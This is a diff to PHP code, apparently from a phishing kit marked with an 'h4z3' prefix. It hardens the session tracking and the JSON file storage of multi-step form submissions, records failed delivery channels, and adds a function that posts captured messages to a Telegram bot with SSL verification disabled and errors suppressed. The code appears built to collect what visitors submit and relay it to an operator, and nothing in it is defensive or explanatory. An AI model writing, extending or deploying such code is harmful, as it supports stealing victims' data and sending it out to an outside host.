@@ -23,35 +23,71 @@ function getUserIP()
 
 function h4z3_get_session_storage_path()
 {
+    static $storageAvailable = null;
     global $sessionStoragePath;
+
+    if ($storageAvailable === false) {
+        return null;
+    }
 
     if (empty($sessionStoragePath)) {
         $sessionStoragePath = __DIR__ . '/../storage/session_data.json';
     }
 
+    if (!function_exists('file_put_contents') || !function_exists('mkdir')) {
+        $storageAvailable = false;
+        return null;
+    }
+
     $directory = dirname($sessionStoragePath);
     if (!is_dir($directory)) {
-        mkdir($directory, 0755, true);
+        if (!@mkdir($directory, 0755, true) && !is_dir($directory)) {
+            $storageAvailable = false;
+            return null;
+        }
     }
 
     if (!file_exists($sessionStoragePath)) {
-        file_put_contents($sessionStoragePath, json_encode(["sessions" => []], JSON_PRETTY_PRINT), LOCK_EX);
+        $initialPayload = json_encode(["sessions" => []], JSON_PRETTY_PRINT);
+        if (@file_put_contents($sessionStoragePath, $initialPayload, LOCK_EX) === false) {
+            $storageAvailable = false;
+            return null;
+        }
     }
 
+    $storageAvailable = true;
     return $sessionStoragePath;
 }
 
 function h4z3_initialize_tracking_session()
 {
-    if (session_status() === PHP_SESSION_NONE) {
-        session_start();
+    static $initializationFailed = false;
+
+    if ($initializationFailed) {
+        return null;
+    }
+
+    try {
+        if (session_status() === PHP_SESSION_NONE) {
+            session_start();
+        }
+    } catch (Throwable $throwable) {
+        $initializationFailed = true;
+        return null;
     }
 
     if (empty($_SESSION['h4z3_tracking_id'])) {
         $sessionId = session_id();
+
         if (empty($sessionId)) {
-            $sessionId = bin2hex(random_bytes(16));
+            try {
+                $sessionId = bin2hex(random_bytes(16));
+            } catch (Throwable $throwable) {
+                $initializationFailed = true;
+                return null;
+            }
         }
+
         $_SESSION['h4z3_tracking_id'] = $sessionId;
     }
 
@@ -61,11 +97,19 @@ function h4z3_initialize_tracking_session()
 function h4z3_load_session_store()
 {
     $path = h4z3_get_session_storage_path();
-    $contents = file_get_contents($path);
-    $decoded = json_decode($contents, true);
 
-    if (!is_array($decoded)) {
+    if ($path === null || !is_readable($path)) {
+        return null;
+    }
+
+    $contents = @file_get_contents($path);
+    if ($contents === false || $contents === '') {
         $decoded = ["sessions" => []];
+    } else {
+        $decoded = json_decode($contents, true);
+        if (!is_array($decoded)) {
+            $decoded = ["sessions" => []];
+        }
     }
 
     if (!isset($decoded['sessions']) || !is_array($decoded['sessions'])) {
@@ -78,7 +122,12 @@ function h4z3_load_session_store()
 function h4z3_write_session_store(array $store)
 {
     $path = h4z3_get_session_storage_path();
-    file_put_contents($path, json_encode($store, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
+
+    if ($path === null) {
+        return false;
+    }
+
+    return @file_put_contents($path, json_encode($store, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX) !== false;
 }
 
 function h4z3_store_submission($step, array $payload)
@@ -86,11 +135,20 @@ function h4z3_store_submission($step, array $payload)
     $sessionId = h4z3_initialize_tracking_session();
     $store = h4z3_load_session_store();
 
+    if ($sessionId === null || $store === null) {
+        return false;
+    }
+
     if (!isset($store['sessions'][$sessionId])) {
         $store['sessions'][$sessionId] = [
             'handled' => false,
             'entries' => [],
+            'failed_channels' => [],
         ];
+    }
+
+    if (!isset($store['sessions'][$sessionId]['failed_channels']) || !is_array($store['sessions'][$sessionId]['failed_channels'])) {
+        $store['sessions'][$sessionId]['failed_channels'] = [];
     }
 
     $normalizedPayload = [];
@@ -115,7 +173,76 @@ function h4z3_store_submission($step, array $payload)
     $store['sessions'][$sessionId]['entries'][] = $entry;
     $store['sessions'][$sessionId]['last_updated'] = $entry['timestamp'];
 
-    h4z3_write_session_store($store);
+    return h4z3_write_session_store($store);
+}
+
+function h4z3_mark_channel_failure($channel)
+{
+    $sessionId = h4z3_initialize_tracking_session();
+    $store = h4z3_load_session_store();
+
+    if ($sessionId === null || $store === null) {
+        return false;
+    }
+
+    if (!isset($store['sessions'][$sessionId])) {
+        $store['sessions'][$sessionId] = [
+            'handled' => false,
+            'entries' => [],
+            'failed_channels' => [],
+        ];
+    }
+
+    if (!isset($store['sessions'][$sessionId]['failed_channels']) || !is_array($store['sessions'][$sessionId]['failed_channels'])) {
+        $store['sessions'][$sessionId]['failed_channels'] = [];
+    }
+
+    if (!in_array($channel, $store['sessions'][$sessionId]['failed_channels'], true)) {
+        $store['sessions'][$sessionId]['failed_channels'][] = $channel;
+    }
+
+    return h4z3_write_session_store($store);
+}
+
+function h4z3_send_telegram($message, $botUrl, $chatId)
+{
+    if (!function_exists('curl_init') || !function_exists('curl_setopt') || !function_exists('curl_exec')) {
+        return false;
+    }
+
+    if (empty($botUrl) || empty($chatId)) {
+        return false;
+    }
+
+    $endpoint = "https://api.telegram.org/{$botUrl}/sendMessage";
+    $ch = @curl_init($endpoint);
+
+    if (!$ch) {
+        return false;
+    }
+
+    $payload = [
+        'chat_id' => $chatId,
+        'text' => $message,
+    ];
+
+    $optionsApplied = @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)
+        && @curl_setopt($ch, CURLOPT_POST, 1)
+        && @curl_setopt($ch, CURLOPT_POSTFIELDS, $payload)
+        && @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+    $result = false;
+
+    if ($optionsApplied) {
+        $response = @curl_exec($ch);
+        $result = ($response !== false);
+    }
+
+    if (is_resource($ch) || is_object($ch)) {
+        @curl_close($ch);
+    }
+
+    return $result;
 }
 ###########################################################
 $ip2 = getUserIP();
